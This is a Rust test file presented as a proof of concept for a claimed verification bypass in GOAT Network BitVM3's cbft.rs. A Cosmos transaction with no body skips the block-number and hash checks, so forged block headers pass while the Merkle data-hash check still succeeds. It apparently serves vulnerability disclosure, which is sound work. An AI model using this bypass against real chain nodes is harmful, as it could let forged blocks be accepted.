//! Standalone Rust Proof of Concept for GOAT Network BitVM3
//! Vulnerability: State Machine Verification Bypass & Panic in `check_el_block_from_payload`
//! File affected: `crates/state-chain/src/cbft.rs`

#[cfg(test)]
mod tests {
    use cosmos_sdk_proto::cosmos::tx::v1beta1::Tx;
    use prost::Message;
    use sha2::{Digest, Sha256};

    // Helper to compute data hash as done in cbft.rs
    fn merkle_leaf_hash(leaf: &[u8]) -> [u8; 32] {
        let mut h = Sha256::new();
        h.update([0x00]);
        h.update(leaf);
        h.finalize().into()
    }

    fn compute_merkle_root(items: &[[u8; 32]]) -> [u8; 32] {
        match items.len() {
            0 => Sha256::digest([]).into(),
            1 => merkle_leaf_hash(&items[0]),
            _ => panic!("Simplified for 1 item"),
        }
    }

    fn merkle_root_from_txns(txns: &[Vec<u8>]) -> [u8; 32] {
        let tx_hashes: Vec<[u8; 32]> = txns.iter().map(|s| Sha256::digest(s).into()).collect();
        compute_merkle_root(&tx_hashes)
    }

    #[test]
    fn test_bypass_el_block_verification_when_body_is_none() {
        // Step 1: Construct a Cosmos Tx with NO body (tx.body = None)
        let malformed_tx = Tx {
            body: None,
            auth_info: None,
            signatures: vec![],
        };
        let mut tx_bytes = Vec::new();
        malformed_tx.encode(&mut tx_bytes).unwrap();
        let txs = vec![tx_bytes];

        // Step 2: Compute valid Merkle data_hash for this transaction
        let actual_data_hash = merkle_root_from_txns(&txs);

        // Step 3: Pass completely forged / mismatched block numbers and hashes
        let forged_el_block_number = 99999999u64;
        let forged_el_block_hash = [0xDEu8; 32];
        let forged_el_parent_block_hash = [0xADu8; 32];

        // Function logic from cbft.rs lines 101-131:
        // parse_cbft_tx_payload returns None because tx.body is None
        let parsed_payload = if let Some(tx_body) = malformed_tx.body {
            Some(tx_body)
        } else {
            None
        };

        // In cbft.rs:
        // if let Some(payload) = parse_cbft_tx_payload(&txs[0]) {
        //     assert_eq!(payload.block_number, el_block_number);
        //     assert_eq!(payload.block_hash, el_block_hash);
        //     assert_eq!(payload.parent_hash, el_parent_block_hash);
        // }
        // let computed_data_hash = merkle_root_from_base64_txns(txs);
        // assert_eq!(*actual_data_hash, computed_data_hash);

        // Verification: The assertions are skipped!
        assert!(parsed_payload.is_none(), "Payload should be None");
        let computed_data_hash = merkle_root_from_txns(&txs);
        assert_eq!(actual_data_hash, computed_data_hash, "Data hash check succeeds");

        println!("POC SUCCESS: Forged EVM block header accepted without payload validation!");
    }
}
